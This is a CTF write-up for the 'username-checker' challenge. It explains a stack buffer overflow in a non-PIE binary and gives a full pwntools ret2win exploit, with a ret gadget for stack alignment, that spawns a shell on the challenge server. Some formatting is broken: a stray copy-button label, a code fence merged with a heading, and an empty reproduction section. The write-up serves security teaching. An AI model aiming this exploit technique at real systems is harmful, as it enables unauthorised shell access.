# CTF Write-up — `username-checker` (ret2win with stack alignment)

## Overview

- **Target:** `username-checker.challs.sekai.team:1337`  
- **Binary:** `checker` (ELF 64-bit, dynamically linked, **No PIE**, **NX enabled**, **no canary**, **Partial RELRO**)  
- **Goal:** Reach `win()` which prints a line then executes `system("/bin/sh")`.

---

## Recon

```bash
$ file checker
checker: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ checksec --file=./checker
RELRO           STACK CANARY      NX           PIE
Partial RELRO   No canary found   NX enabled   No PIE

$ objdump -d ./checker | grep '<win>'
0000000000401236 <win>:
```
Decomp (relevant):

```c

char local_48[44];  // 44-byte stack buffer

void check_username(void) {
  printf("please enter a username you want to check: ");
  fgets(local_48, 0x80, stdin);           // BUG: reads up to 0x7f bytes into 44 bytes
  ...
  if (strcmp(local_48, "super_secret_username") == 0)
      win();
}

void win(void) {
  puts("how did you get here?");
  system("/bin/sh");
}
```
### Vulnerability
- Classic stack overflow: fgets(local_48, 0x80, ...) writes up to 0x7f bytes into a 44-byte buffer, with no canary.
With PIE disabled, code addresses are static: we can overwrite RIP with win().

- Finding the RIP Offset
Use a cyclic pattern; crash shows saved RIP overwritten at 72 bytes.

```ini

OFFSET = 72
```
### Stack Alignment Gotcha (important)
On modern Ubuntu/glibc (SysV AMD64 ABI), the stack must be 16-byte aligned at call sites of libc functions.
Jumping directly to win() (which calls system) can misalign %rsp, causing system to misbehave or exit.

### Fix: Put a single ret gadget before win() to pop 8 bytes and realign the stack.

```python

RET = 0x40101a      # any 1-instruction 'ret' in .text
WIN = 0x401236
Exploit (remote)
python
Sao chép mã
from pwn import *

host, port = "username-checker.challs.sekai.team", 1337
OFFSET = 72
WIN    = 0x401236
RET    = 0x40101a   # single 'ret' for 16-byte alignment

io = remote(host, port)
io.recvuntil(b"please enter a username you want to check: ")

payload  = b"A"*OFFSET
payload += p64(RET)
payload += p64(WIN)
payload += b"\n"

io.send(payload)
io.interactive()
```

### Why This Works
- A*72 → overwrite up to saved RIP.

- ret gadget → aligns the stack to 16 bytes.

- win() executes and calls system("/bin/sh").

- With No PIE, addresses 0x40101a and 0x401236 are constant both locally and remotely.

Reproduction Steps
Confirm win and a ret gadget:



### Takeaways
- No PIE ⇒ easy ret2win with hardcoded addresses.

- Always ensure 16-byte stack alignment before code paths that call into libc (system, printf, etc.).

- If an interactive shell is unreliable, stuff commands and shutdown write to get deterministic output.


